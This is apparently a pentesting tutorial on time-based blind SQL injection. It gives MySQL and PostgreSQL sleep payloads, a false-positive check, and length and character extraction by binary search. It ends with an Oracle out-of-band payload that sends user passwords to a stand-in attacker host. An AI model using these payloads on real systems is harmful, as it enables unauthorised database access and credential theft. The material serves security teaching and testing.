# Time-Based Workflow

**Objective:** To extract data from a completely silent application by forcing the database to pause (sleep) before returning the webpage. If the database pauses, the injected condition was True. If it loads instantly, the condition was False.

---

## Phase 1: Identification (The Stopwatch Test)
Your first goal is to prove that the database is processing your input as executable code, even if it refuses to show you the result.

**1. Establish the Baseline:**
* Measure how long the webpage takes to load normally (e.g., `?id=5`). 
* *Baseline:* ~500 milliseconds.

**2. Inject the Delay Payload:**
* Inject a sleep command corresponding to the suspected database engine. Use a high enough number to completely rule out normal network lag (10 seconds is standard).
* **MySQL:** `?id=5' AND SLEEP(10)--+`
* **PostgreSQL:** `?id=5'; SELECT pg_sleep(10)--`

**3. Evaluate the Response:**
* *Instant Load:* The application is secure, or you are using the wrong database syntax.
* *Delayed Load:* If the browser's loading spinner spins for exactly 10 seconds and then loads the page, **Time-Based SQLi is confirmed.**

---

## Phase 2: The False Positive Check
Time-Based attacks are highly prone to false positives caused by bad internet connections, overloaded servers, or Web Application Firewalls (WAFs) holding the connection open while they inspect it.

**The Verification Test:**
If 10 seconds works, immediately change the payload to 5 seconds.
* `?id=5' AND SLEEP(5)--+`
* *If the page takes 5 seconds, you are genuinely controlling the database.*
* *If the page still takes 10 seconds (or times out completely), the network is unstable or a WAF is blocking you.*

---

##  Phase 3: Length Enumeration
Just like Boolean-Based extraction, you must find the length of the string before you start guessing characters. We wrap the `LENGTH()` check inside an `IF` statement.

*(Note: These examples use MySQL syntax)*

**The Logic:** If the length is X, sleep for 5 seconds. Else, sleep for 0 seconds.

* **Payload:** `?id=5' AND IF(LENGTH(@@version) = 1, SLEEP(5), 0)--+` *(Loads instantly)*
* **Payload:** `?id=5' AND IF(LENGTH(@@version) = 2, SLEEP(5), 0)--+` *(Loads instantly)*
...
* **Payload:** `?id=5' AND IF(LENGTH(@@version) = 10, SLEEP(5), 0)--+` *(Page takes 5 seconds to load)*

**Conclusion:** The version string is exactly 10 characters long.

---

## Phase 4: Systematic Character Extraction
We combine the binary search method (Greater Than / Less Than) with the `SLEEP` function to isolate and identify ASCII characters.

**Target:** Character #1 of the version string.

**1. The Binary Search Method:**
* **Payload:** `?id=5' AND IF(ASCII(SUBSTRING(@@version, 1, 1)) > 100, SLEEP(5), 0)--+`
    * *Observation:* Page takes 5 seconds to load. 
    * *Conclusion:* The ASCII value is greater than 100.
* **Payload:** `?id=5' AND IF(ASCII(SUBSTRING(@@version, 1, 1)) > 115, SLEEP(5), 0)--+`
    * *Observation:* Page loads instantly.
    * *Conclusion:* The ASCII value is between 101 and 115.

Repeat this binary halving process until you hit the exact number.

**2. The Final Confirmation:**
* **Payload:** `?id=5' AND IF(ASCII(SUBSTRING(@@version, 1, 1)) = 110, SLEEP(5), 0)--+`
    * *Observation:* Page sleeps for 5 seconds.
    * *Conclusion:* The first character is 'n' (ASCII 110).

---

## Phase 5: The Reality of Time-Based Extraction
**Time-Based extraction is agonizingly slow.** Think about the math: If it takes an average of 6 requests to binary-search a single character, and every correct "True" guess takes 5 seconds to execute, extracting a 32-character password hash could take several minutes of just waiting for the server to sleep.

**Alternatives (Out-of-Band SQLi):**
Professional pentesters avoid Time-Based extraction if possible. If a server is completely blind, instead of asking it to sleep, we ask it to make a DNS request to a server we control (like Burp Collaborator). 

* **Example (Oracle):** Instead of `DBMS_PIPE.RECEIVE_MESSAGE`, we use `UTL_HTTP.REQUEST('http://hacker-server.com/' || (SELECT password FROM users))`. The database reaches out to us and hands over the password instantly.
